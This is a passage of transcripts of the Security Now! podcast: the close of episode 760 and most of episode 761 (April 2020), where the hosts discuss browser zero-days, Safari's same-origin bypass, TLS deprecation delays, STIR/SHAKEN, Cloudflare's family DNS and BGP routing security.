LEO:  And they have some evidence that this is a worthy thing to do?  I mean, I know in theory it is.  It uses a lot of electricity, so we would want to make sure that it is in fact going to do some good instead of just kind of make you feel good.



STEVE:  Yeah.  Given that or bitcoin pooling...



LEO:  Well, that's dumb, yeah.



STEVE:  Yeah.



LEO:  But what's, I'm just curious, I mean, again, it makes everybody feel good.  But is it really doing anything?



STEVE:  I'm not enough an expert to comment either way.  Maybe we'll do some more digging or have some people who know more.



LEO:  It's not insignificant, if they're driving that many exabytes, insignificant use of power.  I mean, somebody once observed that the bitcoin mining is using more power than the entire solar power installations of the globe could provide, which means it's not a good thing.  As long as it's doing something of value.  But if it's just making people feel "I'm solving the problem," you know, I'd like to know, I'd like to see their success stories, I guess.



STEVE:  Yeah, that would be good.  I cannot speak to it authoritatively one way or the other.



LEO:  I think on the website, I looked once, they have some success stories.  But I'm not probably qualified to judge it.  So forgive my skepticism, but I'd like to know more.



STEVE:  Skepticism's a good thing, my friend.



LEO:  I'm always skeptical of things that make everybody feel good, but don't have any apparent real value.  But who knows?  And you're certainly welcome to do it.  I did it for a while, and it used so much power and got my machine so hot, I thought, maybe I won't do this.  The fans were on all the time.  It was crazy.  Crazy.  But Washington University at St. Louis School of Medicine is a nice organization, so I'm sure it's fine.



Steve, we're done.  Go rest your throat, you poor fellow.



STEVE:  We are.  I'll do that.



LEO:  Yeah.  Feel - I know you're feeling better, but drink some honey.  Honey and whiskey.



STEVE:  Actually, that's what Lorrie's been making me is Earl Grey with caffeine and some honey.



LEO:  Nice.  Perfect.



STEVE:  In order to soothe my throat.



LEO:  Perfect.  Thank you, Steve.  Steve Gibson does this show every Tuesday, and you're welcome to watch us do it live.  That's about 1:30.  It's right after MacBreak Weekly, so it's maybe 2:00 o'clock Pacific time.  That would be 5:00 p.m. Eastern time.  That'd be 21:00 UTC if you want to tune in.  TWiT.tv/live has video and audio streams.  Of course most people want to listen on demand because you want to have a whole set.  You want to collect all 700 and whatever episodes.



So if you're a collector, if you'd like to have the complete set of 760 episodes, go to Steve's site, GRC.com.  You'll find little teeny-weeny 16Kb versions of the show.  You'll find the full 64Kb audio of the show.  You'll also find something he has uniquely, which is the transcripts of the show.  He pays to get those done every week.  And that's really great if you like to follow along while you're listening.  That's all at GRC.com.



While you're there, pick up SpinRite, the world's best hard drive recovery and maintenance utility.  And there's lots of other free stuff there.  Browse around because it's a treasure trove for people who like to learn things.  You can also get copies of the show at our website, TWiT.tv/sn.  We have audio, and we also have video, oddly enough.  You can get it there.  And best thing to do probably would be subscribe in your favorite podcast application.  Then you don't even need to have to think about it.  It'll just be there of a Tuesday evening or a Wednesday morning, just in time for your commute from your bedroom to your living room.



We hope you enjoy the show, and we'll see you next time.  Bye, Steve.



STEVE:  Bye-bye, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#761

DATE:		April 7, 2020

TITLE:		Zoom Go Boom!

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-761.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week starts off with a bunch of web browser news including Firefox zero-days, Safari's recent scrape, more coronavirus-related feature rollbacks, the status of TLS v1.0 and 1.1, and some interesting developments on the Edge front.  We revisit the lingering STIR and SHAKEN telco protocol mess, then look at a new DNS-filtering add-on service from Cloudflare and at the growing influence of an Internet group hoping to tighten up the mess with BGP.  After a quick update on my SpinRite project, we take a look at what's been going on with the security of Zoom, the suddenly chosen tool for hosting Internet virtual classrooms and meetings of all kinds.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about including a Mozilla Firefox zero-day.  It's been fixed, but just barely.  A problem with Safari.  BGP gets some MANRS.  And what's wrong with Zoom, and a pretty good alternative.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 761, recorded Tuesday, April 7th, 2020:  Zoom Go Boom!



It's time for Security Now!, the show where we cover your security and privacy and safety and quarantine online.  Here is the king of his own quarantine, for 15 years running now, Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Speaking from the...



LEO:  Fortress of Solitude.



STEVE:  ...what became of the Fortress of, thank you, the Fortress of Solitude.  Yes.



LEO:  You've been in quarantine since 1989.



STEVE:  Yeah.  I think that explains why I so rarely get sick is that I've had very little human contact.



LEO:  It is.  If you had third-graders, you'd be getting sick, absolutely.



STEVE:  Yeah.  Yeah.  Ask any teacher who's teaching elementary school.



LEO:  Oh, my god, yeah.  Or any parent, yup.



STEVE:  Constant challenge.  So we've got Episode 761 for this latest first Tuesday of the month.  Next week will be Patch Tuesday the 14th.  Today is of course the 7th.  There were a couple interesting large topics, but there was so much in the press this week about the explosion of popularity of Zoom, which I guess just because of ease of use and word of mouth, it just - it's the telecommuting app, teleconferencing app which has really taken off.



And as really would be the case I think for any app that suddenly is put under massive use, it's shown some cracks and problems.  There have been a whole variety of things, from the fact that it was initially used in a nonsecure way with, sort of in retrospect, laughable consequences to people taking a closer look at it and finding it wanting from a security standpoint in a number of different ways.  Anyway, today's show title is "Zoom Go Boom!"



LEO:  Quite apt.



STEVE:  And we're going to wrap up by talking about all that.  But there was a bunch of other stuff.  I actually, for the first time ever, created a new major category for the podcast, which is Browser News, because there just is so much browser news that it just made sense to give it its own section now.  And as we know, the browsers are the way we poke ourselves out onto the public Internet, and similarly the way the public Internet pokes back at us.  So the security of the browser, the security features of our browsers are becoming really more and more important.



So we're going to start off with a bunch of web browser news, including some Firefox zero-days, Safari's recent scrape, more coronavirus-related feature rollbacks in our browsers, the current status of TLS v1.0 and 1.1, and some interesting developments on the Edge front.  We then revisit the lingering STIR and SHAKEN telco protocol mess in the wake of some legislation that passed unanimously last week that at least represents that someone's awake somewhere.



We're going to look at a new DNS filtering add-on service from Cloudflare, and at the growing influence of an Internet group hoping to tighten up the mess with BGP, which we'll also briefly review.  I'll quickly update on where I stand with my ongoing SpinRite project, which has all of my attention now.  And then we will have some fun taking a look at exactly how Zoom went boom in the last month.  So I think a great podcast for our listeners.



LEO:  Lots of information.  Lots of fun, too.  All right, Mr. G.



STEVE:  I owe our Picture of the Week to somebody who tweeted it to me in the nick of time.



LEO:  Earlier this morning, in other words.



STEVE:  Yes, yes.  I looked through my backlog, and nothing really seemed to fit.  And so I thought, let me just check Twitter and see if anybody has tweeted me something that would be fun.  And so we have a picture of someone's backyard with a little headstone, a little pet-size headstone.  The title is "The Beloved Pet."  And they're standing there.  One of them has taken his cap off.  No one's wearing a cap, but the guy who was took his cap off to stand over and give a moment of thought and prayer to this pet.  And the cartoon, the little balloon says:  "And Olive, though you are no longer with us, know that you will always be in our memories as a password."



LEO:  That's Olive123 to you.



STEVE:  I do appreciate when things that are fun memes in the culture make it out into a cartoon like that because it says, yes, there's a lesson to be learned.



LEO:  Don't use Olive.



STEVE:  No.  Not Olive.  So Mozilla just patched a pair of critical zero-days, that is, obviously in Firefox, that were being used successfully in targeted attacks against Firefox users.  Both were critical remote code execution flaws resulting from some memory mishandling with a dangling use-after-free pointer which, as we know, was previously pointing to allocated memory.  The memory was released, but the pointer remained available for abuse.  Firefox versions prior to the current, which is - I always check my version when I'm reading one of these pieces of news.  Version 74.0.1 is where we all want to be now.  Anything before that has a problem.  They were being found used in targeted attacks in the wild.



The first of the two is being tracked as CVE-2020-6819, as I said, a use-after-free vulnerability tied to a browser component.  This is like an internal insider thing, "nsDocShell destructor," which is a client of the nsI-HttpChannel API.  Like I said, okay, something deep inside.  It's a function of the browser related to reading HTTP headers.  So obscure, but important.  In the case of the second vulnerability, which is 2020-6820, so the previous one plus one, the attackers are targeting the Firefox browser component known as "ReadableStream," which is an interface to the Streams API which is responsible for breaking up a resource received over the Internet into smaller chunks for the consumer of the stream.



Anyway, attackers would induce a potential victim to visit a maliciously crafted website to trigger these vulnerabilities and execute arbitrary code on devices running unpatched versions, that is, any version of Firefox previous to 74.0.1.  And exploitation of either of these vulnerabilities would potentially enable the attacker to compromise the vulnerable system.  And since it was actually being done in the wild, we can assume that exactly that was happening.  We don't have any more details.  They're being withheld pending maybe something related to other browsers.



The vulnerabilities were reported by two security researchers, Francisco Alonso and Javier Marcos, both of JMP Security.  Last week on April 3rd Francisco tweeted from @revskills.  He said:  "There is still lots of work to do and more details to be published, including other browsers.  Stay tuned."  And that's interesting because, as we know, Firefox sort of now is the lone wolf from the pack.  It's not Chromium-based.  And almost everything else is, under the covers.  Not Firefox.  So it's hard to imagine that something that would affect Firefox - unless maybe like the Tor browser, which is also Firefox-derived.  I don't know.



Anyway, maybe we'll find out more in the future.  Maybe they are just sort of teasing people without anything to back it up.  We'll see.  But anyway, targeted attack.  It's unlikely that any of us were targets, although, well, I do prefer Firefox still.  Although we'll have a little bit of news here in a few minutes that may indicate that I might be becoming less faithful.  We also received an important security update for Chrome.  Just I'll mention that in passing.  As far as we know, none of the eight security bugs that were eliminated from Chrome last week with its update to 80.0.3987.162 - and when I looked, I had .163 for some reason.  Anyway, but you want to be 162 or later.



As far as we know, they were not zero-days being actively exploited.  But we do know that a number of them were rated critical and, had they been known by an attacker, would have allowed remote code execution if exploited.  So here are two - and this is Chrome, meaning Chromium, meaning everybody except Firefox.  So here in these two stories is a perfect example of why browsers are getting their own section of this podcast now because this is the way people get attacked is through their browsers.



And speaking of which, Safari, okay, there's another browser that's a significant market share, neither Firefox nor Chromium  So I'm glad I mentioned that.  We've just learned that, until recently, merely visiting a website, either a malicious website or a legitimate site unknowingly hosting a malicious ad, using Apple's Safari browser could have given attackers access to your device's front and rear cameras, its microphone, its location, and even some of its user's saved passwords.



The fortunately responsibly disclosed seven-vulnerability Safari exploit chain which made this possible also made its discoverer, Ryan Pickren, $75,000 richer, which was a bounty paid by a presumably very grateful Apple Computer for this work, and for Ryan's private disclosure to them of what he discovered, this very advanced piece of work.  And we all know that Ryan could have made a bunch of money if he'd sold this elsewhere, maybe as much as 10 times more money.  So that would have been selling it to the dark side, absolutely for use in exploiting unsuspecting people.  So tip of the hat to Ryan for doing the right thing and selling this thing to Apple, you know, his discovery.



He notes at the bottom of his wonderfully detailed, step-by-step exposition - I have a link to it in the show notes - of his multiple discoveries that all this only works still on Safari 13.0.4 or earlier, meaning earlier this year and earlier.  This is significant since Apple has been issuing a series of updates following Ryan's private disclosure to Safari from 13.0.5, which was released at the end of January, through 13.1, which was published on March 24th, 2020.  So Ryan's discoveries were responsibly disclosed, whereupon Apple began fixing things and patching things quickly.



What's interesting, Ryan lays out the entirely of his attack on the page - which, Leo, you've got on the screen right now - which I strongly recommend to anyone who's interested, like all the OWASP guys should take a look at this because this is all about web app security.  But I'll summarize the high points, which all of our listeners will understand, since they break one of the absolute golden rules of browsers everywhere.  What Ryan found was a robust and practical means of bypassing Safari's enforcement of the same-origin policy.  And, you know, we talk about how crucial, I mean, like that's the pillar on which today's browser security is standing is that you do not allow content from other origins to somehow get into your browser in the current origin and get mixed.



So Ryan figured out how to do that.  And that's how, in fact, the user plaintext passwords were also compromisable, since Safari uses the same same-origin policy to detect websites on which password autofill needs to be applied.  So his hack was able to trick Safari into misapplying those origins and to disclose secrets and all kinds of other stuff.  So anyway, he discovered a total of seven different vulnerabilities that he was able to link together in a complex chain in order to pull off an important and very powerful exploit.  So again, congrats to him.  And there it is, there's the last browser of the set, all of which has just had serious remote exploit possibilities.



Meanwhile, Chrome and Edge have joined Mozilla in postponing their deprecation of TLS v1.0 and 1.1.  It was two weeks ago that I mentioned that Mozilla had formally announced their plans to quickly restore their just-deprecated v1.0 and 1.1 of TLS in Firefox 74 due to the coronavirus issues.  They learned that there were people who were attempting to gain health-related information from websites that were still not supporting 1.2 or 1.3, and users of Firefox were receiving scary-looking security blocked screens.



Well, now we have that screenshot that you've got up there, Leo, is from Chrome, discussing the pending forthcoming release of 81 under the topic of "Remove TLS 1.0 and 1.1," which was the plan.  They now say:  "Note:  Removal of TLS 1.0 and 1.1 has been delayed to Chrome 83, which is expected to ship in late May of 2020."  They did it for the same reason.  They said - I guess it was Microsoft who was more clear.  They just said they're pushing it back.  Microsoft with Edge has done the same thing.  They posted on the 31st of March under "Plan for change:  TLS 1.0 and 1.1 soon to be disabled by default."



The principal project manager lead on the Edge Developer Experience, he said:  "As announced in October" - October 2018 is when they all decided, all the browsers collectively decided we're going to remove this from our browsers here.  It was projected for spring of 2020, now.  He wrote:  "Microsoft will soon disable TLS 1.0 and 1.1 by default in Microsoft browsers."  And note that the key there is "disable."  There will be a setting where you could turn it back on if you needed to.  They're not ripping it out, but they're just going to flip it off.



"But," he wrote, "in light of current global circumstances, we will be postponing this planned change, originally scheduled for the first half of 2020."  He said:  "For the new Microsoft Edge, based on Chromium, TLS 1.0 and 1.1 are currently planned to be disabled by default no sooner than Microsoft Edge v84."  So they're staying in sync with Google's plans also, currently planned, well, they're saying for July of 2020.  Google said May.



"For all supported versions of IE11 and Microsoft Edge Legacy, TLS 1.0 and TLS 1.1 will be disabled by default as of September 8, 2020."  So they're going to push that back further.  They said:  "While these protocols will remain available for customers to reenable as needed, we recommend that all organizations move off of 1.0 and 1.1 as soon as practical.  Newer versions of the TLS protocol enable..." blah blah blah, you know, better security and so forth.



So I thought, okay, where is the world now, at this point?  Ivan Ristic's wonderful SSL Labs reports that over 97% of the sites that Qualys's SSL Labs has surveyed will accept connections over either TLS 1.2 or 1.3.  This was the data coupled with vendors' own telemetry that all four of the major browser vendors - Apple, Google, Microsoft, and Mozilla - back in October of 2018 drove them to decide, okay, it's time to shut it down.  At the time, Apple reported that on their platforms less than 0.36% of HTTPS connections made by Safari were still using 1.0 or 1.1.  Google had their number at 0.5.  Microsoft said that for them it was 0.72.



And interestingly, Firefox's stats were higher than the others for some reason, at 1.2%.  I guess that would suggest that the demography of Firefox users is slightly different than Chrome, which is still way out in the lead.  But for whatever reason, it was probably time.  As we know, unless there was some push, those things would never go away.  And of course the security issues aren't critical, or they would have been immediately killed.  It's just like, yeah, okay, we're not happy with the security any longer.  Let's just kill it off once and for all.  And it's good to remove legacy crap from our clients if it's no longer needed.  So it just simplifies the codebase, which, you know, makes it easier to maintain moving forward.



And Chrome is also reversing themselves on their planned enforcement of SameSite cookies.  Last week on Friday Justin Schuh, who's Google's Director of Chrome Engineering, posted on the Chromium blog "Temporarily rolling back SameSite," which is the name of the posting, "Temporarily rolling back SameSite Cookie Changes."



He said:  "With the stable release of Chrome 80 in February" - which is where we still are.  Remember that 81 was supposed to come out in mid-March, but that's been pushed back - "Chrome began enforcing secure-by-default handling of third-party cookies as part of our ongoing effort" - this is Google speaking - "to improve privacy and security across the web.  We've been gradually rolling out this change since February and have been closely monitoring and evaluating ecosystem impact, including proactively reaching out to individual websites and services to ensure their cookies are labeled correctly."



And I'll remind our listeners what this whole SameSite thing is in a second.  He said:  "However, in light of the extraordinary global circumstances due to COVID-19, we are temporarily rolling back the enforcement of SameSite cookie labeling, starting today.  While most of the web ecosystem was prepared for this change, we want to ensure stability for websites providing essential services including banking, online groceries, government services, and healthcare that facilitate our daily life during this time.  As we roll back enforcement, organizations, users and sites should see no disruption."  So again, in other words, this was going to ruffle some feathers, and the decision was made, okay, those feathers are going to need to be ruffled sooner or later.  Let's do it.  But now it's like, uh, let's do it later.



He finishes, saying:  "We recognize the efforts of sites and individual developers who prepared for this change and appreciate the feedback from the web ecosystem which has helped inform this decision.  We will provide advance notice on this blog and the SameSite Updates page when we plan to resume the enforcement, which we're now aiming for over the summer."  So my thinking is that that, too, may get pushed back a little further.



So our listeners may recall that we previously discussed Google's plan in this regard in great detail, probably on a podcast with that name.  As we know, Google has some folks in there who really dislike cookies for session state maintenance, and who have proposed a complete cookie replacement.  But they also recognize the virtual impossibility of overthrowing the status quo in the short term.  And then some.  So instead, they're working to tighten things up as much as they can by porting some of their dream replacement system's - which is never going to happen - features into cookie land for the time being, and thus remaining within the current system, but making it stronger.



So they planned to, well, and were since February, requiring websites which intend to use third-party cookies to explicitly declare that fact in the cookies parameter list by introducing a new cookie parameter named SameSite.  This allows the website to explicitly assert essentially a cookie usage policy for that cookie.  And the big change in Chrome's behavior was that it would no longer accept policy-free unlabeled cookies when they appeared in a third-party context.  So, yeah.  For people who weren't paying attention, I mean, this has been coming for a long time.  I can't remember when we did the podcast about it.



So again, it was one of those, "We're going to do this.  We own 68% of the world's browser share, so pay attention because your stuff's going to break."  But of course nobody's going to pay attention until their stuff does break.  So breakage was beginning.  Now it's been put off for a while.  I have a link in the show notes to a very thorough SameSite cookie concept explainer, which is the same one that we were referencing back when we talked about all this in the first place.  It's web.dev/samesite-cookies-explained.  And it's got a big tray of tasty-looking cookies at the top.  Thank you, Leo.  And then a really very clear walkthrough about what this is and what it's all about and what it's doing.  So anyway, as Justin posted, since it will break some things, it'll eventually happen, but no one's in the mood for breaking things right now.  So we're going to wait a while.



And Leo, I think it was you during the podcast, maybe it was last week, who mentioned the just-breaking news at the time that Microsoft's Edge browser would be getting vertical tabs.  And we  talked about that a bit.  So I just wanted to note that it's looking very hopeful that vertical tabs will be coming to Edge.  According to reports, Microsoft's own Corporate VP for Microsoft Edge, a guy named, I guess it's Liat Ben-Zur, really, really wants this feature.  He was quoted saying:  "I find myself losing track of all my tabs, and I'll accidentally close a tab as a result.  Utterly frustrating, as that is usually exactly the one page I needed."  To which I say, "Amen, brother."



From the demos I've seen, they're just going to be a little boxy icon thing in the far upper left corner of the Edge browser window, which just clicking it toggles the tabs from across the screen to top down the left-hand edge and back and forth.  And I'll just bet that once that has become a single-click feature, the rest of the world will finally wake up to how obviously correct this has always been.  Sort of like the idea of using a mouse to move an onscreen pointer around.  Just that's like the right way to do it.  Once you see it, you can't go back.



So, but there's more.  Beyond vertical tabs, the other interesting feature we don't know a lot about yet, but it's also what's coming soon to Edge, is something that Microsoft calls "Smart Copy."  The idea is that when you mark and click and drag a region of a web page in order to sort of rectangular lasso it, and then copy that, when you subsequently paste it into a destination container such as an email message, thanks to this forthcoming feature, the content will be smart about its destination and will arrange to retain its original formatting, which typically doesn't happen these days.  So that'll be another nice feature that Edge gets.



And browsers being an important issue, I titled this next piece "Who's on Second?"  We all know that Google has essentially taken over the browser market.  Chrome currently commands a 68.5% share of the entire market.  And historically Firefox has held second place, with IE in third place and Edge in fourth.  But around last November, October/November, Edge's gradual rise overtook IE as IE's share softened and slowly dropped.  Which moved Edge into third place behind Firefox.  But Firefox had also been very gradually losing steam until, yes, last month it happened.  Edge and Firefox also exchanged places, which moved Edge into second place behind only Google.  And while it's a very distant second place, at 7.59% share to Google's 86.5, it's a significant milestone.



And NetMarketShare's graph, which you've got on the screen there, Leo, for the past year pretty convincingly reveals that we're seeing a long-term trend here, and not just a little blip.  Edge has been moving up.  IE and Firefox have been losing steam, and Edge is now the number two browser in the marketplace.  So it's nice that it's based on Chromium, and it and Chrome will probably be pretty much at parity.



Okay.  Non-browser security news.  The return of STIR and SHAKEN.  The U.S. Federal Communications Commission, our FCC, last Tuesday unanimously passed new rules to require all originating and terminating voice service providers to implement STIR/SHAKEN in the Internet Protocol portions of their networks by, unfortunately, not like tomorrow, but the 30th of June, 2021.  So, what, a year and a quarter from now.



We've all seen some tortured acronyms before, but, well, especially SHAKEN.  STIR and SHAKEN are right up there.  STIR stands for, and we did a podcast on this a while ago.  For anyone who's interested, if you don't remember it, if you joined since then, STIR stands for Secure Telephone Identity Revisited.  Okay.  But SHAKEN is like, ugh, S-H-A-K-E-N, Signature-based Handling of Asserted Information Using ToKENs.  Oh, boy.



LEO:  They had STIR, clearly.  And they said, oh, it'd be cool if we had SHAKEN.



STEVE:  Wouldn't that just put us right there with Bond, yes.  Yow.  So S-H-A is Signature-based, we forget the "B," Handling for the H, of Asserted, okay, now we've got all the S-H-A.  Now we forget about Information Using because we have nothing to do with the "I" and the "U," and now we need KEN.  So toKENs.  Ugh.  Anyway, somebody really struggled with that one, every bit as much as they're struggling with the protocol itself.



Even when the U.S. carriers have implemented the STIR and SHAKEN protocols, assuming that actually happens, and that's not a given, the problem still won't have been solved for us.  I mean, the whole issue here is authentication of call originators.  And actually call recipients, also, but that seems less a problem.  So recall that, when we covered this extensively before, our entire global telephony network is currently missing any and all means for any type of authentication of a call's origin, and for assuring the call's destination.  The call originator asserts, with no authentication whatsoever of that assertion, the phone number and identity of its caller.



Of course we all who have - anyone with a phone knows the consequence of that, which is everyone seems to be calling you from, like, for me, it's Laguna Beach.  It's like, I don't know why, but that's where the call appears to be originating.  No.  Nothing prevents that originating phone number and identity from being spoofed.  Which is of course the problem we find ourselves with today.



When implemented, STIR and SHAKEN will only provide this authentication in the U.S.  In other words, it's the FCC saying to the U.S. telecom carriers, you must do this in the U.S.  So that means that only when both the originating and terminating voice service providers are both in the U.S., and also assuming that they didn't go through an intermediary, that is, a third party, it probably didn't.  So only then would we actually know that the caller ID is correct.  And despite the fact that the calls that come to me claim to be originating in Laguna Beach, the access on the phone at the other end, when I make the mistake of picking one of those up for some reason, makes it pretty clear that they're probably not located near me.  So if they're originating outside the U.S., they can still be spoofed.  And this system does nothing about it.



So, now, in practice, I wouldn't mind if I could set my phone to never ring for a non-fully authenticated end-to-end call because, you know, for me, I would like to be able to get calls from people in the U.S. and know that it's really who they say they are.  So that would be nice.  It doesn't solve the problem for people doing business overseas, for people who have families, you know, outside the U.S.  But still, you know, baby steps.



So there's a lot of pushback from the telco industry.  They're using these same arguments.  They're saying, why are you making us spend all this money to upgrade our equipment when it's not actually going to solve the problem.  So it remains to be seen what happens a year and a half from now.  But again, we clearly have a technology-based problem.  Part of the solution exists for calls staying within the U.S.  There's no reason we can't at least fix that much of the problem.  So it would be nice.



Cloudflare has added parental control to their 1.1.1.1 DNS service.  Since many of us are at home with our families and young ones, maybe poking around the Internet more than usual, I thought I'd mention a new, just-released, or announced, DNS-based content filtering service offered by Cloudflare.  The idea is simple, and it's cool.  Simply by tweaking a family's network DNS settings, Cloudflare will offer content-filtered, based on domain name, domain name-based content-filtered DNS, which will refuse to locate and look up sites which parents would presumably prefer that their unsupervised children did not visit.  It's available in two tiers.  There is malware blocking sites only, and then there's malware plus adult content blocking.



In their announcement, Cloudflare asserted that all of the same privacy guarantees, which applies to their primary 1.1.1.1 service, applies to these alternate services.  And it's as easy as changing your DNS.  If you want only malware blocking, you switch to 1.1.1.2 as your primary, and 1.0.0.2 as your secondary DNS.  If you want malware and adult content blocking, it's .3, so 1.1.1.3 for primary DNS, 1.0.0.3 for your secondary DNS.



And then they did also say that during the coming months they will also be working on developing and providing users with somehow additional configuration settings for the 1.1.1.1 for Families service, which is how they're branding this.  In his announcement, the CEO of Cloudflare, Matthew Prince, said:  "This year, while many of us are sheltering in place, protecting our communities from COVID-19 and relying on our home networks more than ever, it seemed especially important to launch 1.1.1.1 for Families."  Which, again, is the way they're branding it.



They did have a little out-of-the-gate problem.  And when I saw this, I thought, wow, Leo, I'm getting old.  Some new initials have been added:  LGBTQIA+.



LEO:  Hmm.  I know LGBTQ.  I don't know what the IA is.



STEVE:  Well, whatever Intersex is, that's I, because I went and looked it up.



LEO:  We have a lot of genders now.  There's many, many genders.



STEVE:  You know, I was thinking we ought to just add "S" for straight.  And then we could just get rid of the whole thing and just say "people."



LEO:  That's true.  If you added "S," it's everybody but "S."



STEVE:  Then you've got it whole.  You've got everything covered and just scrap all this nonsense and just say "people."  Anyway, so what happened was, by mistake, shortly after the launch of the new family-friendly service, some users realized that a number of, and I guess this is now the acronym, LGBTQIA+ sites - and by the way, you googled that?



LEO:  Oh, yeah.



STEVE:  It's a thing.  Those were also restricted.  It turned out to be a mistake, as I said, and one which Matthew Prince felt awful about, clearly.  He explained that the mistake was caused by categorizations used by data providers from whom they license feeds to create the backbone of the filtering service.  He explained that overlapping feeds provided by multiple providers were in use, and that the last few months they had spent verifying which ones to use for the family service.



The generally agreed malware, blacklisted, and malicious websites were easy.  And for the sexually explicit content category, they were aiming to duplicate Google's Safe Search tool.  One of the license providers had an adult content category that mirrored Google, as well as another category that also encompassed LGBTQIA+ sites, and also a broader range of topics.  And that broader filtering category was initially chosen by mistake.  They didn't mean to.  So they quickly fixed the mistake.  They rebuilt their backend filter, and Cloudflare has asked its users to report any remaining inadvertently blocked LGBTQIA+, or let's just say people, websites that they...



LEO:  Well, the plus kind of does it all because it says anything else that we left out.  So it's everybody.



STEVE:  Yeah, could be dot dot dot; right?  Just like, oh.



LEO:  Yeah.



STEVE:  Yeah.  I guess if it were a regex, would that...



LEO:  Yeah, that's what we need is a regex.  Yeah, that'll solve it.



STEVE:  Okay.  So MANRS, an abbreviation for Mutually Agreed Norms for Routing Security.  It boasts some serious founding participants, including Akamai, Amazon Web Services, Azion, Cloudflare, Facebook, Google, Microsoft, and Netflix.



In our very early series of podcasts we did a whole block on how the Internet works.  I detailed the concept of how it creates a virtual data circuit between typically distant endpoints by sending a stream of data packets out onto the so-called Internet and trusting the Internet's amazing routing infrastructure to, at every hop, send the packet forward in the right direction toward its destination.  And in theory, if you've got all endpoints linked together by this ad hoc federation of interconnected routers, and a packet arrives and gets sent out the proper wire to the next router heading in the right direction, eventually it'll get to its destination.  And crazy enough, it works.



And the truth is this wacky non-deterministic system works far better than it has any right to.  Which really stands as a testament to the genius and to the very many correct decisions that were made back at the beginning.  But amazing as the system is, it's not without a few blemishes.  One of the enduring blemishes is BGP, the Border Gateway Protocol.



LEO:  Well, this has been a problem just yesterday.



STEVE:  Yes.  By which the Internet's ad hoc federation of autonomous routers continuously share with each other their routing tables, or actually share with their peers their routing tables to inform each other which network blocks they're connected to out of all of their wires.  Basically what is their, you know, they're saying this is what my routing table looks like.  That information is useful to all of their peer routers.  In the beginning, routing tables were managed by hand.  There was no BGP.  But as the Internet grew, that became, well, more and more difficult to the point of impossibility.  So BGP was brilliantly invented to automate the process.



The problem is that much of the Internet is based upon trust.  For example, as we all know, when a packet is placed onto the Internet, it indicates its IP of origin.  But we know that that origin IP can be deliberately spoofed, and havoc can result.  So, you know, spoofing source IPs is a thing.  The point is that a lot of the Internet is based on trust.  The same is true for BGP.  If someone's router "advertises," as is the term, that it is authoritative for some block of IP space, the router's word will be taken at face value.  And that advertisement will be propagated from one router to the next, far and wide across the Internet.



But if that advertisement was in error, the advertiser of a block of network space it doesn't own will start receiving traffic that it should not receive.  And in turn, the true owner of that network space will be starved of that traffic that it should have legitimately been receiving.  So, you know, the first time you hear that, it's like, what?  It could be broken that easily?  Uh-huh.  And as you said, Leo, it happened recently, and we've covered BGP routing mistakes.



LEO:  The Russians were sucking traffic from Cloudflare and a bunch, a ton of other CDNs.  Every time this happens, you and I have this discussion.  I say, well, isn't there - can't we lock this down?  This can happen so easily by accident, or maliciously.



STEVE:  Yes.  Yes.  So there have been many instances of this through the years.  And when they've been major, I mean, and many of them are smaller.  You know, someone goes dark for a while, and they say to their ISP, hey, what happened?  And they go, oops, sorry, we meant to put a period here, and we put a zed - as you like that term, Leo, I agree with you, it's kind of ambiguous - instead.  So, you know, most of these things appear to be inadvertent.



The possibility does exist for this BGP misrouting to be done nefariously.  So it is possible for routers to be made much more suspicious of incoming BGP advertising claims, you know, in other words, truth in advertising, and to proactively filter out advertisements that just cannot be correct.  That has not historically been the default.  It can be done.  So last week's announcement by MANRS - and I love the term.  I mean, like MANRS is a perfect abbreviation because of what we're talking about is like, okay,  mind your Internet manners.  Don't go making BGP announcements you shouldn't, or propagating them to your neighbors if they might be wrong.



So anyway, the announcement is interesting and hopeful because two new major classes of participants, content delivery networks and cloud providers, are now being brought into this collective.  In their announcement last week, they said new category - it's titled "New category of CDNs and cloud providers join MANRS to improve routing security."



They said:  "Today we're proud to announce the new MANRS Content Delivery Network and Cloud Program.  This new program broadens support for the primary objective of MANRS, to implement crucial fixes needed to eliminate the most common threats to the Internet's routing system.  Mutually Agreed Norms for Routing Security (MANRS) is a global initiative, supported by the Internet Society, that requires collaboration among participants" - it's voluntary - "and shared responsibility for the global Internet routing system."  You know, this can't be imposed on anyone.  It's like, let's collectively take responsibility.  They said:  "It's a community of security-minded organizations committed to making routing infrastructure more robust and secure.



"Originally designed by and for network operators, the initiative has already been extended once to address the unique needs and concerns of Internet Exchange Points.  These two facets of MANRS complement each other.  The first secures customer-provider interactions, while the second creates a safe public peering environment.  CDNs," they say, "are a geographically distributed group of servers that work together to provide fast delivery of Internet content across the globe, and today the majority of web traffic is served through CDNs.  Cloud providers offer network services, infrastructure, and/or applications in the cloud by hosting them in data centers, often distributed around the world, and providing access via the Internet or private interconnections."



And they wrote:  "The two typically peer - exchange traffic directly - with thousands of other networks so that data can flow more efficiently, making them large hubs of the Internet interconnection infrastructure.  Peering with CDNs and cloud providers can drastically improve performance of network services they host, so there's a clear benefit to interconnect with these networks."



And here's sort of what changed.  They said:  "While CDN and cloud are basically edge networks, their impact on routing security can be significant."  So essentially what the MANRS group are acknowledging here is that, though these are technically users of the endpoint networks, they've gotten so big now that they're operating at Internet scale.  And the interconnections are so significant that they need to be brought into this global routing taskforce, essentially.



They said:  "Several known incidents showed that an edge network" - like a CDN or a cloud provider - "even a small one, can cause havoc on the Internet by leaking routes.  MANRS helps by requiring egress routing controls, so networks can prevent such incidents from happening."  That is to say, we were talking before about how the normal BGP behavior, the default behavior is to propagate advertisements even if they're false.  Egress routing controls prevents that propagation.



They said:  "So networks can prevent such incidents from happening."  They said:  "Secondly, leveraging CDNs' and cloud providers' peering power can have significant positive spillover effect on the routing hygiene of networks they peer with.  In other words, if CDNs and cloud providers do their part to improve routing security and demand better practices from their customers, their customers will in turn step up their efforts, and together the Internet will be a better and safer place for all of us."



